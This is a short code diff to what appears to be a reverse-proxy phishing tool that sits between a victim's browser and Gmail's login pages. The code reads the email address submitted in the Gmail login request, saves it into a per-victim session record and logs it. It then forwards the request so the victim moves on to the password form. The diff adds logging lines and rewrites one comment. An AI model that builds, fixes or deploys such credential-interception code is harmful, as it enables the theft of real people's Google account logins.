@@ -33,6 +33,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     makeGmailProcess() {
+        console.log('Processing Gmail request:', this.browserReq.url, 'Method:', this.browserReq.method)
         if (this.browserReq.headers['content-length'] > 0) {
             let cJust = ''
             this.browserReq.on('data', (chunk) => {
@@ -83,7 +84,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
-                    // Don't end the request - let it continue to redirect to password form
+                    // Forward the request to Gmail and let it handle the redirect
                     this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end()
 
@@ -109,6 +110,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 }
             })
         } else {
+            console.log('No content-length, piping request through:', this.browserReq.url)
             this.browserReq.pipe(this.proxyEndpoint)
         }
 
